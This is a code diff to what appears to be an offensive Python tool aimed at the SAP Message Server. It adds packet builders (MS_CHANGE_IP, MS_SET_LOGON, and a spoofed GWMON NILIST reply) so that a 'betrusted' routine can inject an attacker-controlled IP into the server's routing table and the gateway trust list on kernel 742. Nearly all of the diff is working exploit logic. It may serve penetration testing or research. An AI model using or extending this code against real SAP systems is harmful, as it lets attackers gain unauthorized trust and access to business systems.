@@ -107,6 +107,10 @@ ADM_GET_NILIST_PORT  = 0x3c   # MS asks our registered app server for its IP lis
                                # 36-byte extended header).
 ADM_FILE_RELOAD      = 0x1E   # reload config files (incl. ACL)
 
+# MS-level opcodes (distinct from ADM record opcodes above)
+MS_OPCODE_CHANGE_IP  = 0x0E   # MS_CHANGE_IP — update our IP in MS routing table
+MS_OPCODE_SET_LOGON  = 0x06   # MS_SET_LOGON — register DIAG/RFC listener ports
+
 # Opcode in 4-byte opcode section (for non-admin REQUEST/REPLY packets)
 OPCODE_NILIST = 0x07   # MS → AppServer: "send me your IP list"
 
@@ -215,6 +219,58 @@ def ms_build_header(toname: str, fromname: str, msgtype: int,
     h += struct.pack("!H", diag_port)     # [108:110]
     assert len(h) == _HEADER_LEN
     return h
+
+
+def pkt_change_ip(fromname: str, key: bytes, attacker_ip: str,
+                   toname: str = "MSG_SERVER") -> bytes:
+    """Build MS_CHANGE_IP packet — explicitly set our IP in the MS routing table.
+
+    The gelim reference shows this is needed for kernel 742 to propagate
+    the server's IP to the gateway trust list.  Without it, the MS only has
+    the IP from the DP blob (dp_addr_from) which may not be propagated.
+    """
+    hdr = ms_build_header(
+        toname=toname, fromname=fromname,
+        msgtype=MSG_DIA, flag=FLAG_REQUEST, iflag=IFLAG_SEND_NAME,
+        key=key,
+    )
+    opcode_fields = struct.pack("BBBB",
+                                MS_OPCODE_CHANGE_IP,  # opcode
+                                2,                     # opcode_version
+                                0,                     # opcode_charset
+                                0)                     # opcode_error
+    ipv4 = socket.inet_aton(attacker_ip)
+    ipv6 = b"\x00" * 10 + b"\xff\xff" + ipv4    # ::ffff:x.x.x.x
+    return hdr + opcode_fields + ipv4 + ipv6
+
+
+def pkt_set_logon(fromname: str, key: bytes, attacker_ip: str,
+                  port: int, logon_type: int = 2, host: str = "",
+                  toname: str = "MSG_SERVER") -> bytes:
+    """Build MS_SET_LOGON packet — register DIAG/RFC listener port.
+
+    logon_type: 2=DIAG, 6=RFC (gelim: MS_LOGON_DIAG, MS_LOGON_RFC)
+    """
+    hdr = ms_build_header(
+        toname=toname, fromname=fromname,
+        msgtype=MSG_DIA, flag=FLAG_REQUEST, iflag=IFLAG_SEND_NAME,
+        key=key,
+    )
+    opcode_fields = struct.pack("BBBB",
+                                MS_OPCODE_SET_LOGON,  # opcode
+                                1,                     # opcode_version
+                                0,                     # opcode_charset
+                                0)                     # opcode_error
+    logon  = struct.pack("!H", logon_type)       # type (2=DIAG, 6=RFC)
+    logon += struct.pack("!H", port)             # port
+    logon += socket.inet_aton(attacker_ip)       # address (4 bytes)
+    logon += struct.pack("!H", 0)               # logonname_length
+    logon += struct.pack("!H", 0)               # prot_length
+    logon += struct.pack("!H", len(host))       # host_length
+    logon += host.encode("ascii") if host else b""
+    logon += struct.pack("!H", 0)               # misc_length
+    logon += b"\xff\xff"                         # address6_length sentinel
+    return hdr + opcode_fields + logon
 
 
 def ms_parse_header(data: bytes) -> dict:
@@ -544,6 +600,122 @@ def build_nilist_ip_reply(fromname: str, key: bytes,
     return hdr + adm
 
 
+def build_gwmon_nilist_reply(request_pkt: bytes, our_name: str,
+                              attacker_ip: str, kernel_new: bool = True) -> bytes:
+    """Build a GWMON NILIST reply for kernel 742 by mirroring the request routing.
+
+    On kernel 742, the dispatcher sends GWMON requests (RGWMON_SEND_NILIST /
+    RSMONGWY_SEND_NILIST) through the MS with a DP info routing layer.
+    The reply must include the same DP info structure with from/to swapped,
+    flag=MS_REPLY (0x03), and the IP records.
+
+    This function takes the raw incoming request packet, swaps the MS header
+    from/to, changes the flag to REPLY, preserves the DP info, and replaces
+    the ADM payload with our IP records.
+    """
+    if len(request_pkt) < _HEADER_LEN:
+        return b""
+
+    req_hdr = ms_parse_header(request_pkt)
+    if not req_hdr:
+        return b""
+
+    requestor = req_hdr.get("fromname", "")
+    key = req_hdr.get("key", b"\x00" * 8)
+
+    # Detect if this is a RSMONGWY (old format) or RGWMON (new format)
+    use_old_format = b"RSMONGWY" in request_pkt
+
+    if use_old_format:
+        opcode = ADM_NILIST  # 0x07
+        rec1 = _adm_record(ADM_SELFIDENT, b" " * 100, executed=1)
+        rec2 = _adm_record(opcode, _old_nilist_body("127.0.0.1"), executed=1)
+        rec3 = _adm_record(opcode, _old_nilist_body("127.0.0.2"), executed=1)
+        rec4 = _adm_record(opcode, _old_nilist_body(attacker_ip), executed=1)
+    else:
+        opcode = ADM_GET_NILIST_PORT  # 0x3c
+        rec1 = _adm_record(ADM_SELFIDENT, b" " * 100, executed=1)
+        rec2 = _adm_record(opcode, _nilist_ip_body("127.0.0.1"), executed=1)
+        rec3 = _adm_record(opcode, _nilist_ip_body("127.0.0.2"), executed=1)
+        rec4 = _adm_record(opcode, _nilist_ip_body(attacker_ip), executed=1)
+
+    records = b"".join([rec1, rec2, rec3, rec4])
+
+    # Build ADM payload
+    adm  = _ADM_EYE
+    adm += b"\x01\x01"
+    adm += ("%11d" % _ADM_REC_SIZE).encode("ascii")
+    adm += ("%11d" % 4).encode("ascii")
+    adm += records
+
+    # Build MS header with FLAG_REPLY and swapped from/to
+    hdr = ms_build_header(
+        toname=requestor, fromname=our_name,
+        msgtype=MSG_DIA, flag=FLAG_REPLY, iflag=IFLAG_SEND_NAME,
+        key=key,
+    )
+
+    # Extract the opcode+DP info blob from the request (between MS header and ADM
+    # eyecatcher).  Layout: [0:5] opcode fields, [5:512] SAPDPInfo1 (507 bytes).
+    # SAPDPInfo1 field offsets:
+    #   [0:4]   dp_req_len     [4] dp_req_prio    [5] dp_type_from
+    #   [6:46]  dp_fromname    [46] dp_agent_type_from
+    #   [47]    dp_worker_type_from  [48:50] dp_worker_from_num
+    #   [50]    dp_addr_from_t [51:53] dp_addr_from_u [53] dp_addr_from_m
+    #   [54:58] dp_respid_from [58] dp_type_to
+    #   [59:99] dp_toname      [99] dp_agent_type_to
+    #   [100]   dp_worker_type_to [101:103] dp_worker_to_num
+    #   [103]   dp_addr_to_t [104:106] dp_addr_to_u [106] dp_addr_to_m
+    #   [107:111] dp_respid_to
+    DP_PREFIX = 5   # opcode(1) + opcode_version(1) + opcode_charset(1) + opcode_error(1) + dp_version(1)
+    adm_pos = request_pkt.find(_ADM_EYE, _HEADER_LEN)
+    if adm_pos > _HEADER_LEN:
+        dp_blob = bytearray(request_pkt[_HEADER_LEN:adm_pos])
+        name_pad = our_name.encode("ascii").ljust(40, b" ")[:40]
+        req_pad = requestor.encode("ascii").ljust(40, b" ")[:40]
+        if len(dp_blob) >= DP_PREFIX + 111:
+            dp = dp_blob[DP_PREFIX:]  # the 507-byte SAPDPInfo1
+            # Save request's from-side addressing
+            req_worker_from = dp[48:50]
+            req_addr_from_t = dp[50:51]
+            req_addr_from_u = dp[51:53]
+            req_addr_from_m = dp[53:54]
+            req_respid_from = dp[54:58]
+            req_worker_to = dp[101:103]
+            # Swap from/to names
+            dp[6:46] = name_pad           # dp_fromname = us
+            dp[46:47] = b"\x03"           # dp_agent_type_from = DISP (3)
+            dp[48:50] = req_worker_to     # dp_worker_from_num = request's worker_to
+            dp[59:99] = req_pad           # dp_toname = requestor
+            dp[99:100] = b"\x01"          # dp_agent_type_to = WORKER (1)
+            dp[100:101] = b"\x01"         # dp_worker_type_to = DIA (1)
+            dp[101:103] = req_worker_from # dp_worker_to_num = request's worker_from
+            dp[103:104] = req_addr_from_t # dp_addr_to_t
+            dp[104:106] = req_addr_from_u # dp_addr_to_u
+            dp[106:107] = req_addr_from_m # dp_addr_to_m
+            dp[107:111] = req_respid_from # dp_respid_to
+            dp_blob[DP_PREFIX:] = dp
+        dp_info = bytes(dp_blob)
+    else:
+        dp_info = b""
+
+    fmt = "old RSMONGWY" if use_old_format else "new RGWMON"
+    print(f"[*] build_gwmon_nilist_reply: {fmt} reply → toname={requestor!r} "
+          f"(FLAG_REPLY+DP) IPs: 127.0.0.1, 127.0.0.2, {attacker_ip}")
+
+    return hdr + dp_info + adm
+
+
+def _old_nilist_body(ip: str) -> bytes:
+    """Build the old kernel 720/742 NILIST IP body (RSMONGWY format)."""
+    import socket as _sock
+    body = struct.pack("!II", 0, 0)
+    body += _sock.inet_aton("0.0.255.255")
+    body += _sock.inet_aton(ip)
+    body += (41 * " ").encode("UTF-16-BE")
+    return body[:101]
+
+
 # ---------------------------------------------------------------------------
 # Push-model NILIST: we connect to the dispatcher and push NILIST data
 # ---------------------------------------------------------------------------
@@ -812,14 +984,23 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                                                               iflag=IFLAG_SEND_NAME,
                                                               attacker_ip=attacker_ip))
                     else:
-                        # PULL MODEL (kernel 749+): reply with IP records directly
-                        # in the ADM response — no TCP listener needed.
-                        # gelim reference: 4 records: AD_SELFIDENT + 3× IP entries.
+                        # PULL MODEL: reply with IP records directly in the ADM
+                        # response — no TCP listener needed.
                         requestor = hdr.get("fromname", "")
                         print(f"[*] AD_GET_NILIST_PORT PULL MODE — "
                               f"replying with IP records to requestor={requestor!r}")
-                        ni_send(sock, build_nilist_ip_reply(
-                            fromname, key, toname=requestor, attacker_ip=attacker_ip))
+                        # If the request has a DP info blob (kernel 742 GWMON),
+                        # use the GWMON reply with DP routing and FLAG_REPLY.
+                        has_dp_info = (adm_eye_pos > _HEADER_LEN + 100)
+                        if has_dp_info:
+                            print(f"[*] DP info detected ({adm_eye_pos - _HEADER_LEN}B) "
+                                  f"— using GWMON reply (FLAG_REPLY + DP routing)")
+                            ni_send(sock, build_gwmon_nilist_reply(
+                                pkt, fromname, attacker_ip, kernel_new))
+                        else:
+                            ni_send(sock, build_nilist_ip_reply(
+                                fromname, key, toname=requestor,
+                                attacker_ip=attacker_ip))
                         nilist_port_replied = True
                         return True   # NILIST exchange complete
             continue   # handled via eye-catcher scan; skip flag-based dispatch
@@ -1151,7 +1332,65 @@ def betrusted(host: str, port: int, attacker_ip: str,
         print(f"[*] Registration complete — {attacker_ip} is in the MS server "
               f"table via MOD_STATE DP blob (dp_addr_from)")
 
-        result["change_ip_sent"] = True   # conceptually: IP is in DP blob
+        # ---- MS_CHANGE_IP + MS_SET_LOGON (needed for kernel 742) -----------
+        # The gelim reference shows kernel 742 needs explicit MS_CHANGE_IP and
+        # MS_SET_LOGON messages after MOD_STATE for the MS to properly propagate
+        # the server IP to the gateway.  On kernel 793 these are optional
+        # (dp_addr_from in the DP blob suffices).
+        # Helper: check if a received packet contains an embedded NILIST request
+        # and handle it.  The MS on kernel 742 bundles NILIST requests with
+        # replies to our MS_CHANGE_IP/SET_LOGON — if we don't check, we miss it.
+        def _check_embedded_nilist(pkt_data, label=""):
+            adm_pos = pkt_data.find(_ADM_EYE, _HEADER_LEN)
+            if adm_pos < 0:
+                return False
+            adm = pkt_data[adm_pos:]
+            if len(adm) < _ADM_HDR_LEN + 1:
+                return False
+            opc = adm[_ADM_HDR_LEN]
+            if opc not in (ADM_GET_NILIST_PORT, ADM_NILIST):
+                return False
+            hdr2 = ms_parse_header(pkt_data)
+            requestor = hdr2.get("fromname", "")
+            has_dp = (adm_pos > _HEADER_LEN + 100)
+            print(f"[*] {label}: embedded NILIST request (opcode={opc:#04x}) "
+                  f"from {requestor!r} — replying with GWMON format")
+            if has_dp:
+                ni_send(sock, build_gwmon_nilist_reply(
+                    pkt_data, our_name, attacker_ip, kernel_new))
+            else:
+                ni_send(sock, build_nilist_ip_reply(
+                    our_name, key, toname=requestor, attacker_ip=attacker_ip))
+            result["nilist_response"] = True
+            result["nilist_sent"] = True
+            return True
+
+        try:
+            print(f"[*] Sending MS_CHANGE_IP ({attacker_ip})")
+            ni_send(sock, pkt_change_ip(our_name, key, attacker_ip))
+            resp_ci = ni_recv(sock, 5.0)
+            print(f"[*] MS_CHANGE_IP reply: {len(resp_ci)}B")
+            _check_embedded_nilist(resp_ci, "MS_CHANGE_IP reply")
+        except (socket.timeout, TimeoutError):
+            print(f"[*] MS_CHANGE_IP: no reply (timeout, may be normal)")
+        except Exception as e:
+            logger.debug(f"MS_CHANGE_IP error: {e}")
+
+        for ptype, port_num, label in [("diag", 3200, "DIAG"), ("rfc", 3300, "RFC")]:
+            ltype = 2 if ptype == "diag" else 6
+            try:
+                print(f"[*] Sending MS_SET_LOGON ({label} port={port_num})")
+                ni_send(sock, pkt_set_logon(our_name, key, attacker_ip,
+                                             port_num, logon_type=ltype))
+                resp_sl = ni_recv(sock, 5.0)
+                print(f"[*] MS_SET_LOGON {label} reply: {len(resp_sl)}B")
+                _check_embedded_nilist(resp_sl, f"MS_SET_LOGON {label} reply")
+            except (socket.timeout, TimeoutError):
+                print(f"[*] MS_SET_LOGON {label}: no reply (timeout)")
+            except Exception as e:
+                logger.debug(f"MS_SET_LOGON {label} error: {e}")
+
+        result["change_ip_sent"] = True
         result["success"] = True
 
         # ---- Wait for MS NILIST request (accelerates trust propagation) ----
@@ -1252,14 +1491,20 @@ def betrusted(host: str, port: int, attacker_ip: str,
                                             iflag=IFLAG_SEND_NAME,
                                             attacker_ip=attacker_ip))
                                     else:
-                                        # PULL MODEL: reply with IP records directly
-                                        print(f"[*] Hold: AD_GET_NILIST_PORT PULL — "
-                                              f"replying with IP records to "
-                                              f"requestor={requestor!r}")
-                                        ni_send(sock, build_nilist_ip_reply(
-                                            our_name, key,
-                                            toname=requestor,
-                                            attacker_ip=attacker_ip))
+                                        # PULL MODEL
+                                        has_dp = (adm_pos2 > _HEADER_LEN + 100)
+                                        if has_dp:
+                                            print(f"[*] Hold: GWMON PULL — FLAG_REPLY+DP "
+                                                  f"to {requestor!r}")
+                                            ni_send(sock, build_gwmon_nilist_reply(
+                                                pkt, our_name, attacker_ip, kernel_new))
+                                        else:
+                                            print(f"[*] Hold: AD_GET_NILIST_PORT PULL — "
+                                                  f"replying to {requestor!r}")
+                                            ni_send(sock, build_nilist_ip_reply(
+                                                our_name, key,
+                                                toname=requestor,
+                                                attacker_ip=attacker_ip))
                                         result["nilist_response"] = True
                                         result["nilist_sent"] = True
                                 else:
